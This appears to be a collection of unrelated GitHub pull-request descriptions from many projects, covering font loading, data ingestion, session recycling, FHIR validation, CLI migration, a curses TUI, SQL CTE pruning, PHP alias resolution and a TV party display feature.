The eyeball arms run on this box tonight were all void: the SR eye tracker had degraded (LeiaInc/LeiaSR#214 — 84–91% CPU, camera pause/unpause with a face present, 6 s first frame after a 4,600-restart black-image storm the previous night). A trivial cube with a measured-perfect pipeline read "super stuttery"; a tracker service restart removed it. Tracker health is now a pre-test check.

body:
Closes #1887.

## The defect

`apps/web/src/layouts/Base.astro` declared `--font-press-start-2p` while the shared theme builds `--special-font` from `var(--font-press-start)` (`packages/ui/src/styles/01_tailwind.theme.css:79`), and `apps/web/src/styles/app.css:16` points `--subheader-font` at that chain. The substitution was guaranteed-invalid, so every `.heading-look-4/5/6` heading fell back to the inherited body font. The deleted pre-migration helper declared the matching name, so the Astro migration introduced the rename — and `test/contract/font-loading.test.ts` was pinning the drifted name.

Measured on the built page, real Chrome:

| | main | this branch |
| --- | --- | --- |
| `.heading-look-4` computed `font-family` | `"Web IBM Plex Sans", …` | `"NL Press Start 2P", …` |
| Press Start 2P requested | never | loaded |
| `.heading-look-3` (header face) | `"Web Nexa Rust", …` | `"NL Nexa Rust Sans Black", …` |

## What changed

`@nl/ui/styles/fonts.css` now owns the four faces and the four `--font-*` properties the theme consumes. web, smashers, and app import it from their app stylesheet; the two Astro shells keep only the `astro-island` wrapper rule. `apps/app`'s next/font stand-in — `src/runtime/fonts.ts`, its `@nl/ui/fonts` Vite alias, and `src/styles/fonts.css` — had no consumer left and is gone.

## Why the metric-matched fallbacks are *not* in the shared file

The obvious move was to restore the fallback faces the Next build generated for every app. I did that first and it regressed the app's games page from 0 to 0.0336 CLS, so I measured instead of assuming.

Advance width of one string at 100px, real face vs its metric fallback:

| family | deviation |
| --- | --- |
| IBM Plex Sans | +0.59% |
| Lilita One | +0.63% |
| Nexa Rust Sans Black | **+2.17%** |
| Press Start 2P | **+140%** (Arial at `size-adjust: 219%`) |

The fallback numbers match the fallback's *line box* to the real face, not its advance widths. For Nexa Rust the +2.2% was enough to wrap a heading onto an extra line, and because `text-xl` fixes the line height the result was pure movement: the game-card container grew 36 px and shifted. Attribution came from an in-page `layout-shift` observer under Lighthouse's mobile profile plus throttling — the shift disappeared only when the Nexa file alone was blocked:

```text
fonts allowed  cls=0.0336  shift: {y:168,h:655} -> {y:132,h:691}   (game-card container)
fonts blocked  cls=0.0000  no shifts
block IBM only cls=0.0336  unchanged
block Lilita   cls=0.0336  unchanged
block Nexa     cls=0.0000  shift gone
```

So the fallback layer is a per-app, measured decision, not a shared default. smashers keeps the set it validated on its loot tables (with the measurement recorded in the file); app and web declare no fallback faces, which is their pre-change behavior. `Press Start 2P`'s 140% deviation is worth its own look — no app currently ships that fallback, so it is latent, and I filed nothing for it yet because it only matters if a future fallback policy adopts these values.

## Verification

Built output, real Chrome, per app:

- **web** — Press Start resolves and loads; fonts blocked vs loaded gives byte-identical element geometry and 0 layout shifts, so the restored face costs no CLS.
- **app** — 0 layout shifts and CLS 0.0000 with fonts allowed and blocked, matching main. Lighthouse mobile over 3 runs: CLS 0/0/0, bytes 666358 → 666319 (39 bytes smaller).
- **smashers** — variable chains and metric values unchanged; inline CSS 320 bytes smaller; transfer 4729117 → 4728798 with identical JavaScript bytes, request count, and CLS 0.
- **docs** — untouched on purpose: no Tailwind theme and one family, so importing the shared file would add three unused faces to every inlined page. Pinned as a deliberate non-adoption.

Local validation:

```text
bun run format:check          1265 files clean
bun run lint                  9 workspaces, 0 warnings / 0 errors
bun run type-check            9 tasks, 0 errors
bun test test/contract/       569 pass / 0 fail across 33 files
bun run test                  11 tasks, 11 successful
bun run build                 5 apps, 0 cached
```

Contract tests updated in lockstep: `font-loading.test.ts` pins the single declaration, the fallback layer as opt-in with smashers as the adopter, the drift fix, and the removed stand-ins; `app-performance.test.ts` drops its assertion that the smashers shell declares the font variables.

author: georgegally
body:
Continues the world-model plan by bounding execution with explicit preconditions/postconditions and adding cautious causal attribution. An observed change is only strongly attributed to Flyd when it matches a predicted effect and arrives with complete correlated tool/verifier evidence; correlation alone is not treated as causation.

<!-- CURSOR_SUMMARY -->
---

> [!NOTE]
> **Medium Risk**
> New execution gating and attribution semantics affect how actions are allowed and outcomes interpreted; not yet wired into the live execution path, but transition `causalComplete` meaning is clarified for downstream consumers.
> 
> **Overview**
> Introduces **`ExecutionGuard`** as a pure pre/post execution boundary for planning: **`checkBefore`** enforces declared preconditions (reusing `GoalCriterion` / `assessGoal`) and treats **approval as a separate flag**; **`verifyAfter`** assesses postconditions and returns **`unknown`** when none are declared (not implicit success).
> 
> Adds **`attributeObservedChanges`** for cautious outcome labeling: strong **`attributed_to_action`** only when a predicted effect matches the diff and evidence is tool/verifier-owned with full correlation; otherwise **`action_consistent`**, **`external_or_unknown`**, or **`contradictory`**.
> 
> **`AGENTS.md`** documents the new pipeline steps and verification test target. **`TransitionNextStateInput.causalComplete`** comment is flipped to mean the action context is still linkable (aligned with attribution). Vitest coverage in **`execution-guard.test.ts`**.

author: cwharris77
body:
## What

First slice of DEP-541 (the full-stat-surface design): the **source layer**. Adds two typed Layer-1 tables and a generic transform + ingest step.

- `nflverse_player_season` / `nflverse_player_week` — the complete `stats_player` box score, one table per source grain, ~145/146 source columns each, generated from the real release headers into `lib/nflverse/raw-tables.generated.ts`.
- `lib/nflverse/raw-stats.ts` — generic `toRawSourceRows(spec, csvRows, crosswalk)`: keeps every source column, coerces `''`/`NaN` → `null`, and — per the design's separation rule — **lands a crosswalk miss with a null ESPN `player_id`** rather than dropping it. No name matching; identity is resolved once, in the canonical layer.
- `scripts/ingest-nflverse.mts` — one generic fetch/transform/chunked-upsert step driving both tables, plus a `raw_source_rows` count on `ingestion_runs`.

Migration scaffolded with `supabase migration new` (not hand-written).

## Why

The curated path read `stats_player_reg`, which omits `pt_*`; the full box score (incl. punting) lives in `regpost`/`week`. Landing the whole frame verbatim is the "store every field, the UI decides" step, and proves the source-table pattern before the remaining datasets are added.

## Tests

- `npx tsc --noEmit` exits 0; `prettier --check` clean; `npm run lint` 0 errors (16 pre-existing warnings).
- `npm test` — 3306 passed, 14 skipped (`lib/nflverse/raw-stats.test.ts` is new: coercion, crosswalk-miss-lands, skip rules, grain).
- `supabase db reset` applies the migration; DB shows `nflverse_player_season` 150 cols / `nflverse_player_week` 152 cols; `db:types` regenerated.
- End-to-end local ingest: 2025 → 2,024 season / 19,400 week rows, identity resolved; spot-checked punters (`pt_att`/`pt_yards`/`pt_inside_20` populated) — the punting gap is closed at the data layer.

## Scope note

Remaining Layer-1 datasets (`pfr_advstats`, `nextgen_stats`, `ftn_charting`, QBR) and the canonical `player_season_stats` consolidation (DEP-544) follow. Seeding the raw tables is deferred (multi-MB) until consolidation reads them.

body:
工作区目录回收后，相关 Botmux 会话仍可能保留活跃记录和常驻 worker。本变更增加可显式配置的 `workspace-recycle` 入口，在外部生命周期成功事件之后关闭已准备的精确目标，并输出可恢复的逐会话资源回读。

- 以会话自身 `workingDir` 与路径段边界发现跨 Bot、群、话题目标，规范化目录别名；排除外部/共享会话，严格检查 store 覆盖。
- 提供 discover / prepare / finish / status 及中立 JSON Hook；各在线 owner daemon 通过主机 HMAC 执行标准关闭，持久日志位于目标工作区之外。
- 忙碌、新输入、身份变化或覆盖缺口会阻止关闭；发起会话先持久交接，其他目标成功后待空闲最后关闭。失败事件、重复事件、部分关闭和丢失回执均有明确恢复语义。
- 成功回收关闭时原子持久化退役标记。通用 resume、CLI/卡片/API 和会话群自动续聊拒绝恢复该会话，会话群不会因拒绝而隐式新建。旧对象保存不能抹掉退役标记，重建同名目录也不能复活旧会话。
- 区分 closed、pending、partial、closed_with_residual，回读活跃注册、出生身份绑定的 PID、RSS/FD/inotify 以及适用持久后端资源，保留标准关闭后的历史记录。

验证：`bun run build` 通过；本轮 15 个测试文件共 435 项通过，包含 4 个工作区回收测试文件，以及会话存储/恢复、真实会话群路由和标准关闭回归。隔离真实 worker 连续 3 轮创建 HTTP listener 与 inotify watcher，标准关闭后 PID 消失、活跃注册为 0、关闭历史保留；随后重新读取 SQLite 并调用通用 resume，仍保持 closed / 0 active。会话群测试通过真实 `finish(succeeded)` 和真实 daemon 路由验证重启读取后拒绝自动恢复与新建。另覆盖失败写盘、锁等待期间退役、旧对象覆盖及独立关闭后的补记。

接入边界：当前使用等价生命周期事件与独立入口验证，实际外部通用 Hook 的时序和失败传播仍需接入后验证。Linux 资源观测有真实进程证据；无法证明所属进程集合的平台或远端残留按 blocker 报告。历史目录缺失仅生成只读候选，不自动清理。详见 `docs/workspace-recycle.md`。

CI：[run 34681204358](https://github.com/deepcoldy/botmux/actions/runs/34681204358) 已完成且 9/9 jobs 通过，包括 3 个完整单元测试分片、Bun 运行时测试、完整构建及 Linux glibc/musl/macOS 二进制验证；对应 HEAD `1caa228601b25f911a76733d60014c5a760cd481`。

author: ha08625-cloud
body:
Task 1 of the section editing lock plan (`documentation/edit_lock_plan.md`): the data model and the one piece of logic every later task consumes. Nothing reads it yet — the router is Task 2 and enforcement is Task 3, so this PR changes no behaviour.

## Changes

- **`backend/app/models/permissions.py`** — `LOCKABLE_AREAS = ("clinical", "reception")`, defined as its own tuple rather than aliased to `AREA_KEYS`, with the reason written down: being locked out means being downgraded to read-only, and only a levelled permission has a read level to downgrade to, so a boolean area can't be locked. `assert set(LOCKABLE_AREAS) <= set(AREA_KEYS)` at module level. The module stays free of FastAPI/SQLAlchemy imports.
- **`backend/app/models/edit_lock.py`** (new) — the `EditLock` model on `edit_locks`, keyed on `area` so "at most one lock per section" is guaranteed by the primary key rather than by acquire-endpoint logic. `user_id` FKs `users.id` with no cascade (logins are deactivated, not deleted). `EDIT_LOCK_IDLE_TIMEOUT` lives here rather than beside `LOCKABLE_AREAS`, because it is lock behaviour and means nothing without the semantics `is_stale` gives it — the docstring says so. `is_stale(lock, now)` is pure: a stale lock is *takeable*, never swept, since the lock poll calls this on every request.
- **`as_utc`** in the same module — SQLite does not round-trip tzinfo on `DateTime(timezone=True)`, so a naive read-back compared against an aware `now` raises `TypeError`. Same fix already present in `api/deps.py` and `api/routers/auth.py`.
- **`backend/app/models/__init__.py`** — exports `EditLock`, `EDIT_LOCK_IDLE_TIMEOUT`, `is_stale`.
- **`backend/alembic/versions/014_edit_locks.py`** (new) — creates the table with explicitly named constraints; downgrade drops it.
- **`backend/tests/test_edit_lock.py`** (new) — 13 tests: the idle boundary (just under / exactly / past the timeout), the naive-datetime read-back shape constructed explicitly rather than via the ORM, side-effect freedom, the `area` primary key refusing a second holder, both areas locked at once, and the FK.

## Testing

- `uv run pytest tests/test_edit_lock.py` — 13 passed.
- `uv run pytest tests/test_models.py tests/test_auth_models.py` — 107 passed (the two files touching `permissions.py` and `users`).

author: lilvamp237
body:
## Purpose
> The service only implemented `ValueSet/$validate-code` - Though `CodeSystem/$validate-code` was already declared in `api_configs.bal` it was not implemented. This PR adds it.

> Resolves: #187 

## Goals
> - Add full `CodeSystem/$validate-code` support (GET/POST type-level, GET instance-level), matching the coverage `ValueSet/$validate-code` already has.
> - Accept a `coding`, `codeableConcept`, or `code`(+`url`), validated against either a persisted CodeSystem (`url`) or an inline `codeSystem` resource that was never separately uploaded.
> - Check a supplied `display` against the matched concept's display and designations (synonyms count as a match).

## Approach
> - `codeSystemValidateCodePost`/`Get` (terminology_connect.bal) parse the request, resolve the target CodeSystem by `id`, `url`, or an inline `codeSystem` resource, and delegate the actual code lookup to `terminology:codeSystemLookUp`.
> - Since that shared library function can only resolve a *persisted* CodeSystem, a new fallback (`lookupInInlineCodeSystem` / `findConceptInConceptList`) recursively searches an inline CodeSystem's own `concept` tree when the primary lookup fails and an inline resource was supplied.
> - The result is converted to the standard `result`/`system`/`code`/`version`/`display`/`definition` `Parameters` shape via the shared `validationResultToParameters`, then `applyDisplayCheck` optionally flips `result` to `false` with a `message` if a supplied `display` doesn't match.
> - Added unit tests for the new helpers (`findConceptInConceptList`, `applyDisplayCheck`) in `tests/conformance_unit_test.bal`, matching this codebase's existing pattern of unit-testing internal lookup/validate-code helpers directly.

## User stories
> As a FHIR terminology API consumer, I want to validate a code (or code+display) against a specific CodeSystem via `$validate-code` by URL, by ID, or against an inline CodeSystem I haven't uploaded in the same way I already do against a ValueSet.

## Release note
> Added the `CodeSystem/$validate-code` operation (GET/POST, type- and instance-level), supporting `coding`/`codeableConcept`/`code`+`url` and inline CodeSystem resources, with optional display validation. `$validate-code` responses now also include `system`, `code`, and `version` alongside `result`/`display`/`definition`.

## Documentation
> Updated in this PR: `miscellaneous/terminology-service/README.md`. 

## Automation tests
> - Unit tests
>   - Added 5: `testFindConceptInConceptListFindsNestedCode`, `testFindConceptInConceptListReturnsNilWhenNotFound`, `testApplyDisplayCheckPassesOnExactMatch`, `testApplyDisplayCheckPassesOnDesignationMatch`, `testApplyDisplayCheckFlipsResultOnMismatch`.
>   - Full suite: 131 passing, 0 failing (`bal test`).
> - Integration tests
>   - Added 12 (`validateCodeCodeSystem1`–`12`) covering: GET by `url`/by instance `id`, POST with `coding`/`code`+`url`/inline `codeableConcept`+`codeSystem`, display match and mismatch, and failure cases (invalid/empty payload, missing code, missing CodeSystem reference).

## Test environment
> - OpenJDK Temurin 21.0.11, Ballerina 2201.13.4, Windows, PostgreSQL.

## Learning
> Reviewed the HL7 FHIR R4 `CodeSystem-validate-code`/`ValueSet-validate-code` operation definitions and compared response shapes against a live terminology server's output to confirm `system`/`code`/`version` should be echoed back. Reused this codebase's existing pattern of delegating `$validate-code` to `$lookup` logic and collapsing the result.

body:
## Goal

Expose the Browser Extension 2.0 discovery settings through a real Chromium/Firefox options page while preserving the already-merged Auto handoff runtime.

## Scope

- add a native `options_ui` page shared by Chromium and Firefox
- expose ignored domains, minimum image size, minimum video size and Auto handoff
- read/write only through the existing bounded `galaxy:get-settings` / `galaxy:save-settings` message contract
- add restore-default behavior and Ctrl/Cmd+S save shortcut
- show bounded ignored-domain count
- responsive layout plus light/dark system appearance
- package HTML/CSS/JS in the Firefox XPI
- treat `options_ui` as a shared manifest field to prevent Chromium/Firefox drift
- retain the merged `handoff-policy.js` / `auto-handoff.js` runtime and tests

## Security

- settings UI does not access `chrome.storage` directly
- no new browser permission is added
- no raw candidate URL is exposed
- normalization and bounds remain enforced by the existing background settings core

## Tests

- static options-page contract for all persisted fields
- bounded runtime-message usage contract
- responsive/dark/focus-visible UI contract
- existing media/settings/auto-handoff policy tests remain enabled
- Firefox XPI exact-content and namespace validation remains enabled

author: enescakir
body:
GitHub Actions still defines an environment variable when the secret behind it is missing, it just sets it to an empty string. Since an empty string is truthy in Ruby, every `Config.x ? ... : ...` check treated such a value as configured.

This broke the GCP E2E runs, which have no GitHub app secrets: GITHUB_APP_ID was set to the empty string, so bin/respirate started the RedeliverGithubFailures strand, which then failed every two minutes in Github.app_client on an empty private key.

Optional config values have no default, so nil and the empty string both mean "not configured" for them. Return nil for both. Config values declared with override are unaffected, so a deployment that really wants an empty string can still ask for one there.

author: anandghegde
body: ## Changes: - The field editor now selects the **JSON** segment when the value is a JSON object or array, instead of only when the column is declared with MySQL's `json` type. - Detection is by content, in a new `SAJSONValueDetector`. Top-level scalars (`42`, `"text"`, `true`, `null`) are deliberately **not** treated as JSON — they are indistinguishable from ordinary column values, and the JSON segment already rejects them, since it parses without `NSJSONReadingFragmentsAllowed`. - Values over 5 MB are not sniffed, so opening the editor on a large blob does not pay for a JSON parse it is unlikely to need. - Hooked in next to the existing PHP-serialized auto-open in `SPFieldEditorController`, and skipped when an image was decoded so that branch keeps its own segment. `_isJSON` only ever covered the `json` column type. JSON is just as often kept in a text column — the issue's `longtext ... CHECK (json_valid())` is the common MariaDB shape — and those had to be switched to the JSON segment by hand on every open. Two notes for reviewers, both deliberate but worth a second opinion: - Detection is content-based, so it also fires on real `json` columns, which previously opened on Text with pretty-printed content. One uniform rule seemed easier to reason about than special-casing, but I am happy to restrict it to non-`json` columns if you prefer. - The JSON text view is `editable="NO"`, so this cannot change what gets saved — the value still comes from `editTextView`. It does mean an editable JSON field now opens on a read-only view and needs one click on **Text** to edit. That matches what the issue asks for, but it is a real trade-off. ## Closes following issues: - Closes: #2514 ## Tested: - Processors: - [ ] Intel - [x] Apple Silicon - macOS Versions: - [ ] 13.5+ (Ventura) - [ ] 14.x (Sonoma) - [ ] 15.x (Sequoia) - [x] 26.x (Tahoe) - [ ] 27.x (Golden Gate) - Localizations: - [x] English - [ ] Spanish - [ ] Other (please specify) - Xcode Version: 26.6 (17F113) Verified against MariaDB 11.8 using the schema from the issue: ```sql `parameters` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin DEFAULT NULL CHECK (json_valid(`parameters`)), `notes` longtext DEFAULT NULL, ``` 15 unit tests added for the detector. Full suite: 1474 tests, 0 failures. ## Screenshots: Both cells are the same `LONGTEXT(1073741823) utf8mb4` type; only the content differs. `parameters` opens on JSON, pretty-printed; `notes` stays on Text. ## Additional notes: While testing I hit an unrelated pre-existing deadlock in `+[SPNavigatorController sharedNavigatorController]`, which `dispatch_sync`es to the main thread while holding the `@synchronized(self)` class lock. If the main thread calls the same accessor concurrently (it does, from `-[SPTablesList tableViewSelectionDidChange:]`), the app hangs permanently. Happy to open that as a separate issue with the sampled stacks. ## Summary by CodeRabbit - **New Features** - The field editor automatically switches to the JSON view when the entered value is a valid JSON object or array, including values in non-JSON fields. - Image content continues to open in its dedicated view when detected. - **Bug Fixes** - Improved recognition of valid JSON values while avoiding incorrect detection of plain text, malformed content, scalar values, and oversized values.

## Summary
- Retires `src/python/translatr.py` (Python-2-only, already unrunnable on any current interpreter) and adopts `cli/` (`@translatr/cli`) as the project's sole translation-management CLI.
- Rewires root `i18n:pull`/`i18n:push` to invoke the Bun CLI directly from source (`bun run cli/src/index.ts pull|push`).
- Adds a `cli-binaries` job to `.github/workflows/release.yml` that builds and publishes native binaries for Linux/macOS/Windows as GitHub release assets on every `v*` tag.
- Rewrites `install.sh` to detect OS/arch and download the matching binary from a GitHub release instead of bootstrapping Python/pip.
- Formalizes the CLI's contract as a new OpenSpec capability (`translatr-cli`), planned and implemented via `/opsx:propose` → `/opsx:tdd` → `/opsx:apply` (see `openspec/changes/sunset-python-cli/`).
- Fixes a real bug found during verification: `push.ts`'s `targetFilter` regex silently matched **zero files** for any `push.target` without a literal `?` before `{locale.name}` — i.e. every real per-app config in this repo (`ui/apps/translatr/...`), not just the CLI's own generated default. Added a regression test.

## Deferred
- Task 3.3 (verifying `install.sh` against a **real** GitHub release's assets) is deferred: no `v*` tag has been pushed yet for the new `cli-binaries` job to have built real assets against, and creating a release from an agent session is out of scope. The download/detection logic itself is covered by `install.test.ts` (stubbed `uname`/`curl`). **Verify this for real the first time a tag is pushed after this merges** — see `openspec/changes/sunset-python-cli/design.md` Risks section.

author: mhenrixon
body: ## Why this exists PR #6 is marked merged, but **its changes never reached `main`**. Its base was `feat/version-lock` (PR #5's branch), and the two merged 16 seconds apart in the wrong order: | Time | Event | |---|---| | 06:45:34 | PR #5 merged `feat/version-lock` → `main` (a9e3d37) | | 06:45:50 | PR #6 merged `feat/update-packages` → `feat/version-lock` (203de5f) | So 203de5f landed on a branch that `main` had already taken. `git merge-base --is-ancestor 203de5f origin/main` is false, and `main` today has `desc "update"` / `def update` with no arguments. This branch is `main` with `origin/feat/version-lock` merged in, which brings 203de5f across. No conflicts, no rewritten history, no cherry-pick. ## What comes back - `update [PACKAGES]`, `--all` and `--force` - `Npm#outdated_packages(only:)` so a named update asks the registry about those packages alone - `every_package_known?` reporting, and the `requested_keys_for` subpath fix from the review pass - `Packager#package_name_for`, the tests for all of it, and the CHANGELOG and README entries ## Test plan - [x] `bundle exec ruby -Itest test/commands_test.rb` — 54 runs, 0 failures, 0 skips (bun installed, so the `--minify` cases ran) - [x] `packager_test` 48, `npm_test` 18, `importmap_test` 38, `minifier_test` 5, `reloader_test` 2 — all green - [ ] Full matrix on CI ## Note on merge order PR #7 (docs site) documents `update [PACKAGES] --all --force` on its CLI page and in the README, so **this should merge before #7** or that page describes a command `main` does not have. https://claude.ai/code/session_01L3wpuSCiMNku28iV83kF8U --- ## Summary by cubic Restores the `update` command changes from PR #6, which were merged into `feat/version-lock` seconds after that branch had already landed on `main` and therefore never reached `main`. `bin/importmap update` now accepts package names, `--all`, and `--force`. **Restored behavior** - `update luxon stimulus-use` re-pins only those packages, asking the registry about them alone. - `--all` is the explicit form of a bare `update`; passing both names and `--all` exits with an error. - A named package that is up to date or has no version to compare is reported; a name with no pin stops the command before anything is touched. - `--force` updates locked packages and keeps each lock at the new version. - Subpath pins like `photoswipe/lightbox` are matched by their base package name. Merge this before PR #7, whose docs site describes these flags. Written for commit e836b1c9cb9a97c487b55ddcea5ac3e760b346f3. Summary will update on new commits. ## Known, not fixed here `update` re-pins a package the registry could not be checked for (a blip sets `error` and leaves `latest_version` nil, and the loop re-pins it anyway). Filed as #11 — it predates this work on the bare `update` path and is upstream behaviour, so it is not folded into a recovery PR.

author: haochenfa
body:
## Summary

The submitted View is now a full-screen **stdlib `curses`** terminal on an interactive TTY: master–detail panes, a sticky Alarm Alert, keyboard accelerators around the same verb commands, closed-choice selectors, and a calendar for datetimes. Scripts, tests, and `PIM_NO_CURSES=1` keep the line-oriented layout so stdin/stdout stay injectable.

US1–US11, prompted create/modify, and one criterion line are unchanged. ADR-0018 accepts curses in `view` only and supersedes the “not curses” clause of ADR-0004. A later polish pass paints the screen as an HKT lecture diary (quiet page, type pins, vermilion/amber stamp) and fixes the human paths that still fought the first curses cut.

## What changed

- **model** — none. No curses, threads, or ANSI in the test surface.
- **controller** — `App.set_status(text, kind)` (`info` / `ok` / `err`) so the View does not sniff substrings. Successful `search` stores the criterion source line, returns `False` on syntax error, and selects the first hit. A syntax error still leaves Current Result unchanged.
- **view** — TTY: `curses` `get_wch` + `timeout(500)`; non-TTY: stdin-reader + `Queue.get(timeout=0.5)`. Shared `layout.py` / `textwidth.py`. Empty-prompt keys (`/`, `c`, arrows, …) map onto existing handlers. Selectors for type, yes/no, alarm kind/unit, dirty save/discard/cancel. Calendar for Event start, Task deadline, and absolute alarms. Diary paint in `theme.py` + `curses_ui.py`: page fill, alarm stamp, `N T E C` pins, paper selection, list headers and time gutter, detail as a card, dim overlays. CJK caret and a scrolling input window. Chooser chips wrap. Search syntax error on a TTY restores the typed line (e2e does **not** re-prompt). Idle `Esc` clears the search filter; dirty save/discard/cancel still ignores Esc. Relative alarms offer At start / 15 minutes / 1 hour / 1 day / Other…; the line UI still types the integer.
- **tests** — unit coverage for theme, layout, keys, widgets, calendar, caret, search retry, Esc-clear, and App status/criterion. Integration and e2e stay scripted through the line UI. Demo verbs unchanged. `print` after a successful search now prints the first hit (selection is no longer empty).
- **docs** — ADR-0018; PRODUCT / ARCHITECTURE / ACCEPTANCE / AGENTS aligned; USER.md and DEVELOPER.md describe the diary screen, keys, calendar, and 256-colour vs 8-colour vs line UI. Plans: `docs/plans/2026-09-11_tui.plan.md`, `docs/plans/2026-09-12_tui-improvement.plan.md`.

Behaviour a reviewer must not miss:

- Failed commands stay atomic; dirty load/quit still cannot drop changes; `now` is still injected; `print all` is still Current Result.
- Dismissed alarms remain View memory, not part of the `.pim` file.
- Search is still one criterion line. There is no query builder, mouse, or theme picker.

## How to check

Platform: macOS, Python 3.12, standard library only.

```bash
python -m unittest
python coverage_report.py
python pim.py
```

Demo (ACCEPTANCE.md §6), typed as today: `create note`, `create event`, `search type = event && description contains "COMP"`, `modify`, `print`, `save as demo.pim`.

On a TTY also try: arrows through Current Result; an OVERDUE/SOON stamp within 500ms with no keypress; `d` dismiss (file on disk unchanged); `/` with a typo (the line stays); idle `Esc` clears the filter; calendar weekday row vs time list do not overlap; CJK in a Note/Contact; dirty `quit` cannot Esc-away; resize and stacked width < 80; `PIM_NO_CURSES=1 python pim.py` still matches e2e.

## Out of scope

Extra Appendix B features (recurrence, PIR links, fuzzy search, changing type, OS notifications, snooze). Third-party TUI (Textual/Rich/Click). GUI. Mouse, user-selectable themes, command palette, idle `o` for load. Course artefacts this PR does not claim: SRS, typeset design document, videos, Honour Declaration.

## Risks / follow-ups

- Wizard composer titles still use the existing prompt labels (`deadline [current] (empty keeps, none clears):`), not a shorter `Create note · text` sentence.
- Help overlay is grouped Move / Act / File, not two visual columns.
- Colour is best on a 256-colour `TERM` (macOS Terminal / iTerm). 8-colour and monochrome fallbacks are reverse title/selection plus a red/amber stamp.

## Commits

- `feat(view): add stdlib curses TUI with a line-UI fallback`
- `feat(view): add selectors and titled panes to the TUI`
- `feat(view): pick event start from a calendar, not ISO text`
- `docs(adr): accept stdlib curses as the TTY view`
- `feat(controller): give status a kind and remember the criterion line`
- `feat(view): paint an HKT lecture diary and keep a mistyped search`
- plus USER/DEVELOPER/plan docs that travel with those steps

author: mrchypark
body:
# Prune unreachable recursive CTE execution

Fixes #29

## Summary

- Fully validate the admitted recursive SQL, then execute only the reachable
  first CTE: its self-recursive term and the outer `SELECT`.
- Prune the unused secondary CTE execution path without weakening admission
  validation.
- Restore the first-CTE derived state and output strictly, including values;
  reject checkpoints whose persisted rows were contaminated by the former
  merged-CTE behavior.
- Retain clean legacy single-CTE and valid clean two-CTE representations within
  the narrow compatibility boundary.

## Evidence

The API path registers a relation, creates the view, ingests edges, queries the
materialized result, restores a fresh API state, and queries again. The
concrete regression `rest_recursive_cte_outer_first_ignores_disjoint_second_cte_across_restore`
proves that a disjoint secondary CTE cannot leak rows into the outer-first
result.

Runtime coverage includes the exact three-row closure, the nine-row cycle,
retraction back to three rows, reinsertion, restart, and contaminated-restore
rejection. Final full workspace validation passed (API 207, runtime integration
249, runtime library 54, core 358), including the strengthened negative-case
proof. Formatting and all-target clippy passed. The release benchmark produced
valid JSON, and the unchanged-25% PR-smoke comparison passed. PR CI and subsequent GHCR
publication remain pending; no S3, deployment, or production acceptance is
claimed.

author: yavon007
body:
Calls through `use function` aliases can resolve to the wrong target when the
call's casing differs from the import, or when a same-named compiled global
function exists. For example, a user function imported as GET_CALLED_CLASS
is bypassed by `get_called_class()`, causing the built-in to run and throw.

Normalize function-alias keys during registration and lookup. When an
unqualified call names an imported function, use only the imported target for
native-function resolution rather than checking global functions first.
Keep absolute/qualified calls and class/constant imports unchanged.
Resolve the imported target before special-function and capability-policy
checks as well: safe functions must not be rejected because their alias names
a restricted built-in, and restricted functions must not evade policy through
an innocuous alias.

Add codegen and PHP/AOT behavioral coverage for mixed-case aliases, built-in
aliases, grouped imports, global name collisions, and explicit global calls.
Codegen assertions verify the selected imported and global targets; the
compiled regression matches PHP output exactly with empty stderr.
Additional compile-only tests ensure an imported exec alias is rejected under
both Nano and WASI, while a user function aliased as extract remains callable.

Focused PHPUnit: 115 tests / 632 assertions pass (11 existing deprecations).
The complete 135-file compiler self-build and --version check pass. The
resulting compiler also builds and runs the regression with PHP-identical output.
Tested on Linux ARM64, PHP 8.5.10 ZTS, GCC and PHPX 4b3a472. No benchmark
speedup is claimed.

author: littlefly1969
body:
## TV-PARTY-TAKEOVER — production closure

A paired NubArca TV assigned to a party now follows it end to end:

`TvSession` → server-authoritative assignment → **server-projected presentation** → party slideshow, or the Party Game on the canonical web stage → back to the slideshow when the game finishes → the takeover again on `restart_game` → GENERAL only when the assignment really becomes general.

Baseline: `origin/main` = `f2014af` (unchanged since the audit). No merge, no deploy, no migration.

### Review round 1 — three findings closed

1. **The display grant follows the presentation.** A single canonical projection, `ITvPartyPresentationService` (the pure `TvPartyPresentations.Decide` over the display resolver), now feeds the control plane, the grant and the TV media gate. `PartyDisplayService.MintAsync` refuses unless the assigned party's presentation is `game`; `ResolveAsync` — behind `/api/party-display/game`, `/join-qr` and `/challenges/{id}/media` alike — honours a grant only while it is still `game`. So: party not live → slideshow → mint refused; game off → slideshow → mint refused and a live grant stops on every route; FINISHED within 15 s → valid; past 15 s → the live grant stops and a new mint is refused; `restart_game → lobby` → mintable again. Validity is recomputed per request (nothing written on a read path); every takeover mints afresh, which revokes any earlier grant. The shell raises its native cover the moment the page reports a refused grant, so the end of a game shows the neutral card, never the page's "unavailable".
2. **The ShowOnTv exception is bound to display-resolvability.** `ResolveViewerAsync` grants the assigned album only when the same projection says the party is showable (the control plane would not say `unavailable`) and the party's owner is the session's. Regression test: the party's guest window closes while its link stays enabled/unrevoked/unexpired → `unavailable` → items, greetings and media bytes of the non-ShowOnTv album all 404; `/api/tv/albums` unchanged.
3. **Startup admission keeps the incomplete-association invariant.** Relaunch and completed pairing both go through one admission that reads the existing Personal Area status before choosing the first screen; `admissionEvents` sends a PIN-less session to the existing `ASSOCIATION_INCOMPLETE` teardown without ever entering a party state (dispatched in one tick: no mode-selector frame). Only a 401 unpairs; transient failures are retried on a capped backoff.

### Final architecture

- **Assignment and presentation are two things.** `TvSession.DisplayAssignment` is still `general | party` (a party names a `PartyAlbumLink`). Beside it, `GET /api/tv/session` now carries `presentation` — `general | slideshow | game | unavailable` — decided on the server by the pure `TvPartyPresentations.Decide` from the party's real state, and an opaque `assignmentKey` (digest of session + link, accepted by no endpoint) so Party A → B, including a new link for the same album, is always a fresh mount. No link id and no token cross.
- **A projection, never a state machine.** It reads the game session and never writes it. The shell knows four words and no phase.
- **Shell = control plane + three surfaces**: `PartySlideshowScreen` (a thin adapter over the existing `ViewerScreen`), `PartyDisplayScreen` (canonical `/party-display/stage` in a WebView), and a native `unavailable` card.

### Behaviour

| Presentation | When | TV shows |
| --- | --- | --- |
| `general` | assignment is general | the normal NubArca TV (mode selector) |
| `slideshow` | party showable, and no game switched on / host may not run games / party not live / game finished (after the closing card) | the party's native slideshow, autoplay: photos, video/HLS, guest uploads, greetings, challenge holds, live refresh — all the existing viewer's policies |
| `game` | party showable, game on and party LIVE: before the first match, every round phase, and the first 15 s of FINISHED | the canonical `PartyTvStage` via a display grant |
